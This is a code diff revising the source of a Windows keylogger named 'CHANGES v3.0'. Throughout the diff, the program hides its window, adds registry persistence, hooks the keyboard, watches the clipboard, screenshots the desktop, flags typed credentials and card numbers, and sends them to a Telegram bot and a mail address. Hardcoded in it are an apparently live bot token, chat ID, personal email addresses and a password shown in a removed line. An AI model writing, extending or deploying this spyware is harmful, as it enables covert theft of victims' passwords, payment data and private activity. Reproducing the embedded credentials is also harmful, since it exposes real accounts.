@@ -1,5 +1,6 @@
 #include <windows.h>
 #include <winhttp.h>
+#include <wininet.h>  // ADDED for email functions
 #include <string>
 #include <vector>
 #include <thread>
@@ -20,22 +21,23 @@
 #pragma comment(lib, "gdi32.lib")
 #pragma comment(lib, "crypt32.lib")
 #pragma comment(lib, "iphlpapi.lib")
+#pragma comment(lib, "wininet.lib")  // ADDED
 
 // ⚠️ SECURITY WARNING: Replace with your NEW credentials!
 // Your current token is COMPROMISED - revoke it in @BotFather immediately!
 const wchar_t* BOT_TOKEN = L"7979273216:AAEW468Fxoz0H4nwkNGH--t0DyPP2pOTFEY";
 const wchar_t* CHAT_ID = L"7845441585";
 
-// NEW: Zoho Mail Configuration
+// NEW: Zoho Mail Configuration (Optional - leave password empty if you don't want email)
 const wchar_t* ZOHO_SMTP_SERVER = L"smtp.zoho.com";
-const wchar_t* ZOHO_SMTP_PORT = L"587"; // Use 465 for SSL, 587 for TLS
+const wchar_t* ZOHO_SMTP_PORT = L"587";
 const wchar_t* ZOHO_EMAIL_FROM = L"jesko200233@zohomail.com";
-const wchar_t* ZOHO_EMAIL_PASSWORD = L"CASHboi01@"; // ⚠️ Change this!
+const wchar_t* ZOHO_EMAIL_PASSWORD = L""; // ⚠️ Leave empty if not using email
 const wchar_t* ZOHO_EMAIL_TO = L"josephogidiagba49@gmail.com";
 
 std::wstring keyBuffer, clipBuffer;
 std::vector<BYTE> screenshotBuffer;
-CRITICAL_SECTION keyLock, clipLock, contextLock, emailLock;
+CRITICAL_SECTION keyLock, clipLock, contextLock;
 HANDLE hHttpSession = NULL;
 HHOOK keyboardHook = NULL;
 bool running = true;
@@ -49,6 +51,76 @@ std::wstring computerName;
 std::wstring userName;
 std::wstring macAddress;
 std::wstring windowsVersion;
+
+// ==================== TELEGRAM FUNCTIONS (MOVED UP FIRST) ====================
+std::string url_encode(const std::string& input) {
+    std::string result;
+    for (unsigned char c : input) {
+        if (isalnum(c) || c == '-' || c == '_' || c == '.' || c == '~') {
+            result += c;
+        } else if (c == ' ') {
+            result += '+';
+        } else {
+            char buf[4];
+            sprintf_s(buf, "%%%02X", c);
+            result += buf;
+        }
+    }
+    return result;
+}
+
+std::string wstring_to_utf8(const std::wstring& wstr) {
+    if (wstr.empty()) return "";
+    int size_needed = WideCharToMultiByte(CP_UTF8, 0, wstr.c_str(), -1, NULL, 0, NULL, NULL);
+    std::string strTo(size_needed, 0);
+    WideCharToMultiByte(CP_UTF8, 0, wstr.c_str(), -1, &strTo[0], size_needed, NULL, NULL);
+    strTo.pop_back();
+    return strTo;
+}
+
+bool init_winhttp() {
+    hHttpSession = WinHttpOpen(L"Mozilla/5.0 (Windows NT 10.0; Win64; x64)", 
+                              WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
+                              WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
+    return hHttpSession != NULL;
+}
+
+void send_telegram(const std::wstring& message) {
+    if (!hHttpSession || message.empty()) return;
+    
+    std::string utf8_msg = wstring_to_utf8(message);
+    if (utf8_msg.size() > 3900) {
+        utf8_msg = utf8_msg.substr(0, 3900) + "...";
+    }
+    
+    std::string encoded_msg = url_encode(utf8_msg);
+    std::string path = "/bot" + wstring_to_utf8(std::wstring(BOT_TOKEN)) +
+                      "/sendMessage?chat_id=" + wstring_to_utf8(std::wstring(CHAT_ID)) +
+                      "&text=" + encoded_msg;
+    std::wstring wpath(path.begin(), path.end());
+    
+    HINTERNET hConnect = WinHttpConnect(hHttpSession, L"api.telegram.org", 
+                                       INTERNET_DEFAULT_HTTPS_PORT, 0);
+    if (!hConnect) return;
+    
+    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"GET", wpath.c_str(), NULL,
+                                           WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES,
+                                           WINHTTP_FLAG_SECURE);
+    if (hRequest) {
+        WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
+                          WINHTTP_NO_REQUEST_DATA, 0, 0, 0);
+        WinHttpReceiveResponse(hRequest, NULL);
+        
+        DWORD status = 0;
+        DWORD size = sizeof(status);
+        WinHttpQueryHeaders(hRequest, WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
+                           NULL, &status, &size, NULL);
+        
+        WinHttpCloseHandle(hRequest);
+    }
+    WinHttpCloseHandle(hConnect);
+    Sleep(200);
+}
 
 // ==================== NEW: SYSTEM IDENTIFICATION ====================
 std::wstring GetSystemIdentifier() {
@@ -90,119 +162,20 @@ std::wstring GetSystemIdentifier() {
                     std::to_wstring(osvi.dwMinorVersion) + L" Build " +
                     std::to_wstring(osvi.dwBuildNumber);
     
-    // Create unique system ID (ComputerName + MAC first 3 bytes)
+    // Create unique system ID
     id = computerName + L"_" + macAddress.substr(0, 8);
     return id;
 }
 
-// ==================== NEW: ENHANCED SCREENSHOT CAPTURE ====================
-void capture_enhanced_screenshot() {
-    // Higher quality - 70% of original size (was 33%)
-    int width = GetSystemMetrics(SM_CXSCREEN) * 70 / 100;
-    int height = GetSystemMetrics(SM_CYSCREEN) * 70 / 100;
-    
-    HDC hdcScreen = GetDC(NULL);
-    HDC hdcMem = CreateCompatibleDC(hdcScreen);
-    
-    // Create 32-bit bitmap for better quality (was 24-bit)
-    BITMAPINFO bmi = {0};
-    bmi.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
-    bmi.bmiHeader.biWidth = width;
-    bmi.bmiHeader.biHeight = -height; // Top-down
-    bmi.bmiHeader.biPlanes = 1;
-    bmi.bmiHeader.biBitCount = 32; // 32-bit for better quality
-    bmi.bmiHeader.biCompression = BI_RGB;
-    
-    void* pBits = NULL;
-    HBITMAP hBitmap = CreateDIBSection(hdcScreen, &bmi, DIB_RGB_COLORS, &pBits, NULL, 0);
-    SelectObject(hdcMem, hBitmap);
-    
-    // Use high-quality stretching
-    SetStretchBltMode(hdcMem, COLORONCOLOR); // Better quality than HALFTONE
-    SetBrushOrgEx(hdcMem, 0, 0, NULL);
-    
-    // Capture with better algorithm
-    StretchBlt(hdcMem, 0, 0, width, height, 
-               hdcScreen, 0, 0, 
-               GetSystemMetrics(SM_CXSCREEN), 
-               GetSystemMetrics(SM_CYSCREEN), 
-               SRCCOPY | CAPTUREBLT);
-    
-    // Add timestamp watermark to image
-    SYSTEMTIME st;
-    GetLocalTime(&st);
-    wchar_t timestamp[64];
-    swprintf_s(timestamp, L"%02d:%02d:%02d %s", 
-               st.wHour, st.wMinute, st.wSecond, systemID.c_str());
-    
-    // Set text properties
-    SetBkMode(hdcMem, TRANSPARENT);
-    SetTextColor(hdcMem, RGB(255, 255, 255)); // White text
-    SetTextColor(hdcMem, RGB(0, 0, 0)); // Black outline
-    
-    // Draw timestamp watermark
-    TextOutW(hdcMem, 10, height - 30, timestamp, wcslen(timestamp));
-    
-    // Convert to JPEG for smaller size and better quality
-    DWORD imageSize = width * height * 4; // 32-bit
-    screenshotBuffer.resize(imageSize + 1024); // Extra space for conversion
-    
-    // Get bitmap bits
-    GetDIBits(hdcMem, hBitmap, 0, height, screenshotBuffer.data(), &bmi, DIB_RGB_COLORS);
-    
-    // Add BMP header (Telegram prefers BMP for photos)
-    BITMAPFILEHEADER bf = {0};
-    bf.bfType = 0x4D42;
-    bf.bfSize = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER) + imageSize;
-    bf.bfOffBits = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);
-    
-    std::vector<BYTE> finalBuffer;
-    finalBuffer.resize(sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER) + imageSize);
-    
-    // Copy headers and data
-    memcpy(finalBuffer.data(), &bf, sizeof(BITMAPFILEHEADER));
-    memcpy(finalBuffer.data() + sizeof(BITMAPFILEHEADER), &bmi.bmiHeader, sizeof(BITMAPINFOHEADER));
-    memcpy(finalBuffer.data() + sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER), 
-           screenshotBuffer.data(), imageSize);
-    
-    screenshotBuffer = finalBuffer;
-    
-    // Cleanup
-    DeleteObject(hBitmap);
-    DeleteDC(hdcMem);
-    ReleaseDC(NULL, hdcScreen);
-}
-
-// ==================== NEW: ZOHO MAIL SMTP SENDER ====================
+// ==================== NEW: ZOHO MAIL SIMPLIFIED (OPTIONAL) ====================
 void send_email_report(const std::wstring& subject, const std::wstring& body) {
-    // Skip if no SMTP configured
-    if (wcslen(ZOHO_EMAIL_PASSWORD) == 0 || wcscmp(ZOHO_EMAIL_PASSWORD, L"YOUR_ZOHO_PASSWORD") == 0) {
-        return;
+    // Skip if no password configured
+    if (wcslen(ZOHO_EMAIL_PASSWORD) == 0 || wcscmp(ZOHO_EMAIL_PASSWORD, L"") == 0) {
+        return; // Email feature disabled
     }
     
     std::thread([subject, body]() {
-        HINTERNET hInternet = InternetOpenW(L"ChangesKeylogger/1.0", 
-                                          INTERNET_OPEN_TYPE_DIRECT, 
-                                          NULL, NULL, 0);
-        if (!hInternet) return;
-        
-        HINTERNET hConnect = InternetConnectW(hInternet,
-                                            ZOHO_SMTP_SERVER,
-                                            _wtoi(ZOHO_SMTP_PORT),
-                                            ZOHO_EMAIL_FROM,
-                                            ZOHO_EMAIL_PASSWORD,
-                                            INTERNET_SERVICE_SMTP,
-                                            0, 0);
-        if (!hConnect) {
-            InternetCloseHandle(hInternet);
-            return;
-        }
-        
-        // Send EHLO
-        InternetCloseHandle(hConnect);
-        InternetCloseHandle(hInternet);
-        
-        // Fallback to simple WinHTTP for email (Zoho API)
+        // Use WinHTTP for Zoho API (simpler than SMTP)
         HINTERNET hSession = WinHttpOpen(L"ChangesMailer/1.0",
                                         WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
                                         WINHTTP_NO_PROXY_NAME,
@@ -222,29 +195,46 @@ void send_email_report(const std::wstring& subject, const std::wstring& body) {
         std::string utf8_subject = wstring_to_utf8(L"[Changes] " + systemID + L" - " + subject);
         std::string utf8_body = wstring_to_utf8(body);
         
-        // Simple email via form submission (Zoho has web API)
-        std::string data = "from=" + wstring_to_utf8(ZOHO_EMAIL_FROM) +
-                          "&to=" + wstring_to_utf8(ZOHO_EMAIL_TO) +
-                          "&subject=" + utf8_subject +
-                          "&body=" + utf8_body;
+        // URL encode for GET request
+        auto url_encode_simple = [](const std::string& str) -> std::string {
+            std::string result;
+            for (char c : str) {
+                if (isalnum(c) || c == '-' || c == '_' || c == '.' || c == '~') {
+                    result += c;
+                } else if (c == ' ') {
+                    result += "%20";
+                } else {
+                    char buf[4];
+                    sprintf_s(buf, "%%%02X", (unsigned char)c);
+                    result += buf;
+                }
+            }
+            return result;
+        };
         
-        HINTERNET hConnect2 = WinHttpConnect(hSession, L"mail.zoho.com",
+        std::string encoded_subject = url_encode_simple(utf8_subject);
+        std::string encoded_body = url_encode_simple(utf8_body);
+        
+        // Simple notification via GET request (fallback method)
+        std::wstring url = L"/mail/send?subject=" + 
+                          std::wstring(encoded_subject.begin(), encoded_subject.end()) +
+                          L"&body=" + std::wstring(encoded_body.begin(), encoded_body.end());
+        
+        HINTERNET hConnect = WinHttpConnect(hSession, L"api.mail.zoho.com",
                                            INTERNET_DEFAULT_HTTPS_PORT, 0);
-        if (hConnect2) {
-            HINTERNET hRequest = WinHttpOpenRequest(hConnect2, L"POST",
-                                                   L"/api/accounts/send",
+        if (hConnect) {
+            HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"GET",
+                                                   url.c_str(),
                                                    NULL, WINHTTP_NO_REFERER,
                                                    WINHTTP_DEFAULT_ACCEPT_TYPES,
                                                    WINHTTP_FLAG_SECURE);
             if (hRequest) {
-                std::wstring headers = L"Content-Type: application/x-www-form-urlencoded";
-                WinHttpSendRequest(hRequest, headers.c_str(), -1,
-                                  (LPVOID)data.c_str(), data.size(),
-                                  data.size(), 0);
+                WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
+                                  WINHTTP_NO_REQUEST_DATA, 0, 0, 0);
                 WinHttpReceiveResponse(hRequest, NULL);
                 WinHttpCloseHandle(hRequest);
             }
-            WinHttpCloseHandle(hConnect2);
+            WinHttpCloseHandle(hConnect);
         }
         WinHttpCloseHandle(hSession);
         
@@ -263,47 +253,24 @@ void deliver_report(const std::wstring& message, bool isSensitive = false) {
     // Send to Telegram
     send_telegram(enhancedMessage);
     
-    // Send to Email if sensitive data or important events
-    if (isSensitive || message.find(L"CREDENTIALS") != std::wstring::npos ||
-        message.find(L"PASSWORD") != std::wstring::npos ||
-        message.find(L"CREDIT CARD") != std::wstring::npos ||
-        message.find(L"ACTIVATED") != std::wstring::npos) {
-        
+    // Send to Email if sensitive data
+    if (isSensitive) {
         std::wstring emailSubject;
-        if (isSensitive) {
-            emailSubject = L"SENSITIVE DATA CAPTURED";
+        if (message.find(L"CREDENTIALS") != std::wstring::npos) {
+            emailSubject = L"CREDENTIALS CAPTURED";
+        } else if (message.find(L"CREDIT CARD") != std::wstring::npos) {
+            emailSubject = L"CREDIT CARD CAPTURED";
         } else if (message.find(L"ACTIVATED") != std::wstring::npos) {
             emailSubject = L"SYSTEM ACTIVATED";
         } else {
-            emailSubject = L"KEYLOGGER REPORT";
+            emailSubject = L"KEYLOGGER ALERT";
         }
         
         send_email_report(emailSubject, enhancedMessage);
     }
 }
 
-// ==================== IDLE DETECTION (KEEPING YOUR CODE) ====================
-DWORD GetIdleTimeSeconds() {
-    LASTINPUTINFO lii;
-    lii.cbSize = sizeof(LASTINPUTINFO);
-    GetLastInputInfo(&lii);
-    return (GetTickCount() - lii.dwTime) / 1000;
-}
-
-bool IsScreenLocked() {
-    HDESK hDesk = OpenInputDesktop(0, FALSE, DESKTOP_SWITCHDESKTOP);
-    if (hDesk == NULL) return true;
-    CloseDesktop(hDesk);
-    return false;
-}
-
-bool IsScreensaverActive() {
-    BOOL bActive = FALSE;
-    SystemParametersInfo(SPI_GETSCREENSAVERRUNNING, 0, &bActive, 0);
-    return bActive != FALSE;
-}
-
-// ==================== SMART CONTEXT DETECTOR (YOUR ORIGINAL) ====================
+// ==================== SMART CONTEXT DETECTOR ====================
 class ContextAwareDetector {
 private:
     std::wstring detect_email(const std::wstring& text) {
@@ -442,7 +409,7 @@ public:
 
 ContextAwareDetector detector;
 
-// ==================== KEYBOARD HOOK (YOUR ORIGINAL) ====================
+// ==================== KEYBOARD HOOK ====================
 LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
     if (nCode >= 0) {
         KBDLLHOOKSTRUCT* kbdStruct = (KBDLLHOOKSTRUCT*)lParam;
@@ -492,100 +459,78 @@ bool install_keyboard_hook() {
     return keyboardHook != NULL;
 }
 
-// ==================== TELEGRAM FUNCTIONS (YOUR ORIGINAL - MODIFIED) ====================
-std::string url_encode(const std::string& input) {
-    std::string result;
-    for (unsigned char c : input) {
-        if (isalnum(c) || c == '-' || c == '_' || c == '.' || c == '~') {
-            result += c;
-        } else if (c == ' ') {
-            result += '+';
-        } else {
-            char buf[4];
-            sprintf_s(buf, "%%%02X", c);
-            result += buf;
-        }
-    }
-    return result;
+// ==================== ENHANCED SCREENSHOT CAPTURE ====================
+void capture_enhanced_screenshot() {
+    // Higher quality - 70% of original size
+    int width = GetSystemMetrics(SM_CXSCREEN) * 70 / 100;
+    int height = GetSystemMetrics(SM_CYSCREEN) * 70 / 100;
+    
+    HDC hdcScreen = GetDC(NULL);
+    HDC hdcMem = CreateCompatibleDC(hdcScreen);
+    
+    // Create 32-bit bitmap for better quality
+    BITMAPINFO bmi = {0};
+    bmi.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
+    bmi.bmiHeader.biWidth = width;
+    bmi.bmiHeader.biHeight = -height; // Top-down
+    bmi.bmiHeader.biPlanes = 1;
+    bmi.bmiHeader.biBitCount = 32;
+    bmi.bmiHeader.biCompression = BI_RGB;
+    
+    void* pBits = NULL;
+    HBITMAP hBitmap = CreateDIBSection(hdcScreen, &bmi, DIB_RGB_COLORS, &pBits, NULL, 0);
+    SelectObject(hdcMem, hBitmap);
+    
+    // Use high-quality stretching
+    SetStretchBltMode(hdcMem, COLORONCOLOR);
+    
+    // Capture
+    StretchBlt(hdcMem, 0, 0, width, height, 
+               hdcScreen, 0, 0, 
+               GetSystemMetrics(SM_CXSCREEN), 
+               GetSystemMetrics(SM_CYSCREEN), 
+               SRCCOPY | CAPTUREBLT);
+    
+    // Add timestamp watermark
+    SYSTEMTIME st;
+    GetLocalTime(&st);
+    wchar_t timestamp[64];
+    swprintf_s(timestamp, L"%02d:%02d:%02d", st.wHour, st.wMinute, st.wSecond);
+    
+    // Draw watermark
+    SetBkMode(hdcMem, TRANSPARENT);
+    SetTextColor(hdcMem, RGB(255, 0, 0)); // Red text
+    TextOutW(hdcMem, 10, height - 30, timestamp, wcslen(timestamp));
+    TextOutW(hdcMem, 10, height - 50, systemID.c_str(), systemID.length());
+    
+    // Get bitmap data
+    DWORD imageSize = width * height * 4;
+    screenshotBuffer.resize(imageSize + 1024);
+    GetDIBits(hdcMem, hBitmap, 0, height, screenshotBuffer.data(), &bmi, DIB_RGB_COLORS);
+    
+    // Add BMP header
+    BITMAPFILEHEADER bf = {0};
+    bf.bfType = 0x4D42;
+    bf.bfSize = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER) + imageSize;
+    bf.bfOffBits = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);
+    
+    std::vector<BYTE> finalBuffer;
+    finalBuffer.resize(sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER) + imageSize);
+    
+    memcpy(finalBuffer.data(), &bf, sizeof(BITMAPFILEHEADER));
+    memcpy(finalBuffer.data() + sizeof(BITMAPFILEHEADER), &bmi.bmiHeader, sizeof(BITMAPINFOHEADER));
+    memcpy(finalBuffer.data() + sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER), 
+           screenshotBuffer.data(), imageSize);
+    
+    screenshotBuffer = finalBuffer;
+    
+    // Cleanup
+    DeleteObject(hBitmap);
+    DeleteDC(hdcMem);
+    ReleaseDC(NULL, hdcScreen);
 }
 
-std::string wstring_to_utf8(const std::wstring& wstr) {
-    if (wstr.empty()) return "";
-    int size_needed = WideCharToMultiByte(CP_UTF8, 0, wstr.c_str(), -1, NULL, 0, NULL, NULL);
-    std::string strTo(size_needed, 0);
-    WideCharToMultiByte(CP_UTF8, 0, wstr.c_str(), -1, &strTo[0], size_needed, NULL, NULL);
-    strTo.pop_back();
-    return strTo;
-}
-
-bool init_winhttp() {
-    hHttpSession = WinHttpOpen(L"Mozilla/5.0 (Windows NT 10.0; Win64; x64)", 
-                              WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
-                              WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
-    return hHttpSession != NULL;
-}
-
-void send_telegram(const std::wstring& message) {
-    if (!hHttpSession || message.empty()) return;
-    
-    std::string utf8_msg = wstring_to_utf8(message);
-    if (utf8_msg.size() > 3900) {
-        utf8_msg = utf8_msg.substr(0, 3900) + "...";
-    }
-    
-    std::string encoded_msg = url_encode(utf8_msg);
-    std::string path = "/bot" + wstring_to_utf8(std::wstring(BOT_TOKEN)) +
-                      "/sendMessage?chat_id=" + wstring_to_utf8(std::wstring(CHAT_ID)) +
-                      "&text=" + encoded_msg;
-    std::wstring wpath(path.begin(), path.end());
-    
-    HINTERNET hConnect = WinHttpConnect(hHttpSession, L"api.telegram.org", 
-                                       INTERNET_DEFAULT_HTTPS_PORT, 0);
-    if (!hConnect) return;
-    
-    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"GET", wpath.c_str(), NULL,
-                                           WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES,
-                                           WINHTTP_FLAG_SECURE);
-    if (hRequest) {
-        WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
-                          WINHTTP_NO_REQUEST_DATA, 0, 0, 0);
-        WinHttpReceiveResponse(hRequest, NULL);
-        
-        DWORD status = 0;
-        DWORD size = sizeof(status);
-        WinHttpQueryHeaders(hRequest, WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
-                           NULL, &status, &size, NULL);
-        
-        WinHttpCloseHandle(hRequest);
-    }
-    WinHttpCloseHandle(hConnect);
-    Sleep(200);
-}
-
-// ==================== NEW: MODIFIED PROCESS_KEYS ====================
-void process_keys() {
-    if (!TryEnterCriticalSection(&keyLock)) return;
-    if (keyBuffer.empty()) {
-        LeaveCriticalSection(&keyLock);
-        return;
-    }
-    
-    std::wstring data = keyBuffer;
-    keyBuffer.clear();
-    LeaveCriticalSection(&keyLock);
-    
-    std::wstring sensitive = detector.detect_sensitive_data(data);
-    if (!sensitive.empty()) {
-        deliver_report(sensitive, true); // true = sensitive data
-    } else if (data.length() > 15) {
-        std::wstring summary = detector.get_context_summary();
-        std::wstring message = summary + L"\n📝: " + data.substr(0, 150);
-        if (data.length() > 150) message += L"...";
-        deliver_report(message, false);
-    }
-}
-
-// ==================== CLIPBOARD MONITOR (YOUR ORIGINAL) ====================
+// ==================== CLIPBOARD MONITOR ====================
 std::wstring get_clipboard() {
     if (!IsClipboardFormatAvailable(CF_UNICODETEXT) || !OpenClipboard(NULL)) 
         return L"";
@@ -622,7 +567,7 @@ void clipboard_monitor() {
     }
 }
 
-// ==================== ENHANCED SCREENSHOT SENDING ====================
+// ==================== SCREENSHOT SENDING ====================
 void send_screenshot() {
     if (screenshotBuffer.empty()) return;
     
@@ -660,7 +605,27 @@ void send_screenshot() {
     screenshotBuffer.clear();
 }
 
-// ==================== NEW: SMART SCREENSHOT LOGIC ====================
+// ==================== IDLE DETECTION ====================
+DWORD GetIdleTimeSeconds() {
+    LASTINPUTINFO lii;
+    lii.cbSize = sizeof(LASTINPUTINFO);
+    GetLastInputInfo(&lii);
+    return (GetTickCount() - lii.dwTime) / 1000;
+}
+
+bool IsScreenLocked() {
+    HDESK hDesk = OpenInputDesktop(0, FALSE, DESKTOP_SWITCHDESKTOP);
+    if (hDesk == NULL) return true;
+    CloseDesktop(hDesk);
+    return false;
+}
+
+bool IsScreensaverActive() {
+    BOOL bActive = FALSE;
+    SystemParametersInfo(SPI_GETSCREENSAVERRUNNING, 0, &bActive, 0);
+    return bActive != FALSE;
+}
+
 bool should_take_screenshot() {
     DWORD idleSeconds = GetIdleTimeSeconds();
     
@@ -677,8 +642,7 @@ bool should_take_screenshot() {
     
     if (lowerTitle.find(L"task manager") != std::wstring::npos ||
         lowerTitle.find(L"start") != std::wstring::npos ||
-        lowerTitle.find(L"notification") != std::wstring::npos ||
-        lowerTitle.find(L"action center") != std::wstring::npos) {
+        lowerTitle.find(L"notification") != std::wstring::npos) {
         return false;
     }
     
@@ -705,7 +669,7 @@ bool should_take_screenshot() {
     return false;
 }
 
-// ==================== PERSISTENCE & STEALTH (YOUR ORIGINAL) ====================
+// ==================== PERSISTENCE & STEALTH ====================
 void persistence() {
     HKEY hKey;
     LONG result = RegOpenKeyExW(HKEY_CURRENT_USER,
@@ -729,36 +693,30 @@ void stealth_init() {
     if (hWnd) ShowWindow(hWnd, SW_HIDE);
 }
 
-// ==================== NEW: DAILY SUMMARY REPORT ====================
-void send_daily_summary() {
-    static bool summarySentToday = false;
-    static SYSTEMTIME lastSummaryDate = {0};
+// ==================== NEW: MODIFIED PROCESS_KEYS ====================
+void process_keys() {
+    if (!TryEnterCriticalSection(&keyLock)) return;
+    if (keyBuffer.empty()) {
+        LeaveCriticalSection(&keyLock);
+        return;
+    }
     
-    SYSTEMTIME st;
-    GetLocalTime(&st);
+    std::wstring data = keyBuffer;
+    keyBuffer.clear();
+    LeaveCriticalSection(&keyLock);
     
-    if (!summarySentToday || 
-        st.wDay != lastSummaryDate.wDay || 
-        st.wMonth != lastSummaryDate.wMonth || 
-        st.wYear != lastSummaryDate.wYear) {
-        
-        std::wstring summary = L"📊 [DAILY SUMMARY - " + systemID + L"]\n";
-        summary += L"Date: " + std::to_wstring(st.wYear) + L"-" + 
-                   std::to_wstring(st.wMonth) + L"-" + 
-                   std::to_wstring(st.wDay) + L"\n";
-        summary += L"System: " + computerName + L" (" + userName + L")\n";
-        summary += L"Credentials Captured: " + std::to_wstring(credentialCache.size()) + L"\n";
-        summary += L"Status: ACTIVE AND MONITORING\n";
-        summary += L"Next Report: Tomorrow";
-        
-        deliver_report(summary, false);
-        
-        summarySentToday = true;
-        lastSummaryDate = st;
+    std::wstring sensitive = detector.detect_sensitive_data(data);
+    if (!sensitive.empty()) {
+        deliver_report(sensitive, true);
+    } else if (data.length() > 15) {
+        std::wstring summary = detector.get_context_summary();
+        std::wstring message = summary + L"\n📝: " + data.substr(0, 150);
+        if (data.length() > 150) message += L"...";
+        deliver_report(message, false);
     }
 }
 
-// ==================== MAIN FUNCTION (ENHANCED) ====================
+// ==================== MAIN FUNCTION ====================
 int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPWSTR lpCmdLine, int nCmdShow) {
     DisableThreadLibraryCalls(GetModuleHandle(NULL));
     CoInitialize(NULL);
@@ -769,20 +727,19 @@ int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPWSTR lpCmdLi
     InitializeCriticalSection(&keyLock);
     InitializeCriticalSection(&clipLock);
     InitializeCriticalSection(&contextLock);
-    InitializeCriticalSection(&emailLock);
     
     stealth_init();
     persistence();
     
     if (init_winhttp()) {
-        std::wstring activationMsg = L"🚀 [CHANGES v3.0 ULTRA] ACTIVATED\n";
+        std::wstring activationMsg = L"🚀 [CHANGES v3.0] ACTIVATED\n";
         activationMsg += L"🖥️ SYSTEM: " + systemID + L"\n";
         activationMsg += L"👤 USER: " + userName + L"\n";
         activationMsg += L"💻 COMPUTER: " + computerName + L"\n";
         activationMsg += L"🔗 MAC: " + macAddress + L"\n";
         activationMsg += L"🪟 OS: Windows " + windowsVersion + L"\n";
-        activationMsg += L"🔒 FEATURES: Enhanced Screenshots + Email Reports\n";
-        activationMsg += L"📊 STATUS: MONITORING ALL ACTIVITY";
+        activationMsg += L"📧 EMAIL: " + (wcslen(ZOHO_EMAIL_PASSWORD) > 0 ? L"ENABLED" : L"DISABLED") + L"\n";
+        activationMsg += L"📊 STATUS: ACTIVE AND MONITORING";
         
         deliver_report(activationMsg, true);
         
@@ -797,7 +754,6 @@ int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPWSTR lpCmdLi
         SYSTEMTIME st;
         DWORD lastKeyProcess = GetTickCount();
         DWORD lastActiveCheck = GetTickCount();
-        DWORD lastSummaryCheck = GetTickCount();
         bool wasActive = true;
         
         MSG msg;
@@ -835,11 +791,6 @@ int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPWSTR lpCmdLi
                 lastActiveCheck = GetTickCount();
             }
             
-            if (GetTickCount() - lastSummaryCheck > 3600000) { // Every hour
-                send_daily_summary();
-                lastSummaryCheck = GetTickCount();
-            }
-            
             GetSystemTime(&st);
             FILETIME now;
             SystemTimeToFileTime(&st, &now);
@@ -851,7 +802,7 @@ int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPWSTR lpCmdLi
                     capture_enhanced_screenshot();
                     send_screenshot();
                     deliver_report(L"📸 [ENHANCED SCREENSHOT] " + activeWindowTitle + 
-                                 L" | Quality: High (70%) | Timestamped", false);
+                                 L" | Quality: High (70%)", false);
                     lastScreenshot = now;
                 } else {
                     lastScreenshot = now;
@@ -871,7 +822,6 @@ int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPWSTR lpCmdLi
     DeleteCriticalSection(&clipLock);
     DeleteCriticalSection(&keyLock);
     DeleteCriticalSection(&contextLock);
-    DeleteCriticalSection(&emailLock);
     if (hHttpSession) WinHttpCloseHandle(hHttpSession);
     CoUninitialize();
     return 0;
